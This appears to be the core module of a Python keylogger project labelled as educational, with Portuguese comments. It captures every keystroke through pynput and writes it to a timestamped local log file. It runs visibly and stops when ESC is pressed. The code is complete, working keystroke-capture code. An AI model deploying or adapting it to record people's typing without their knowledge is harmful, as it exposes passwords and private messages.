"""
Módulo Core - Funcionalidades principais do keylogger

Classes:
    KeyLogger: Classe principal para captura de teclado
"""

from pynput import keyboard
from datetime import datetime
from typing import Callable, Optional, Set
import logging


logger = logging.getLogger(__name__)


class KeyLogger:
    """
    Keylogger básico educacional.
    
    Attributes:
        log_file (str): Arquivo onde os dados serão salvos
        stop_key (keyboard.Key): Tecla para parar o keylogger
        running (bool): Status de execução
        
    Example:
        >>> kl = KeyLogger()
        >>> kl.start()
        >>> # Pressione ESC para parar
    """
    
    def __init__(
        self,
        log_file: str = "keys.log",
        stop_key: keyboard.Key = keyboard.Key.esc,
        ignore_keys: Optional[Set[keyboard.Key]] = None
    ):
        """
        Inicializa o keylogger.
        
        Args:
            log_file: Nome do arquivo de log
            stop_key: Tecla para parar (padrão: ESC)
            ignore_keys: Conjunto de teclas a ignorar
        """
        self.log_file = log_file
        self.stop_key = stop_key
        self.running = False
        
        # Teclas padrão a ignorar
        self.ignore_keys = ignore_keys or {
            keyboard.Key.shift,
            keyboard.Key.shift_r,
            keyboard.Key.ctrl_l,
            keyboard.Key.ctrl_r,
            keyboard.Key.alt_l,
            keyboard.Key.alt_r,
            keyboard.Key.caps_lock,
            keyboard.Key.cmd,
            keyboard.Key.cmd_r,
        }
        
        # Configurar logging
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format="%(asctime)s - %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
    
    def _on_press(self, key) -> None:
        """Callback para tecla pressionada."""
        try:
            # Tecla normal com caractere
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            # Tecla especial
            if key in self.ignore_keys:
                # Ignorar teclas modificadoras
                pass
            elif key == keyboard.Key.space:
                logging.info("Key pressed: [SPACE]")
            elif key == keyboard.Key.enter:
                logging.info("Key pressed: [ENTER]")
            elif key == keyboard.Key.tab:
                logging.info("Key pressed: [TAB]")
            elif key == keyboard.Key.backspace:
                logging.info("Key pressed: [BACKSPACE]")
            else:
                logging.info(f"Key pressed: {key}")
    
    def _on_release(self, key) -> bool:
        """Callback para tecla solta."""
        if key == self.stop_key:
            logger.info(f"Stop key pressed: {self.stop_key}")
            return False
        return True
    
    def start(self) -> None:
        """Inicia a captura de teclado."""
        print(f"🎹 Keylogger iniciado")
        print(f"📁 Logs salvos em: {self.log_file}")
        print(f"⏹️  Pressione {self.stop_key} para parar\n")
        
        self.running = True
        
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as listener:
            listener.join()
        
        self.running = False
        print("\n✅ Keylogger encerrado")
    
    def start_callback(
        self,
        on_key_callback: Callable = None
    ) -> None:
        """
        Inicia o keylogger com callback customizado.
        
        Args:
            on_key_callback: Função chamada a cada tecla pressionada
                Assinatura: def callback(key) -> bool
        """
        self.running = True
        
        def custom_on_press(key):
            if on_key_callback:
                return on_key_callback(key)
            return self._on_press(key)
        
        with keyboard.Listener(
            on_press=custom_on_press,
            on_release=self._on_release
        ) as listener:
            listener.join()
        
        self.running = False
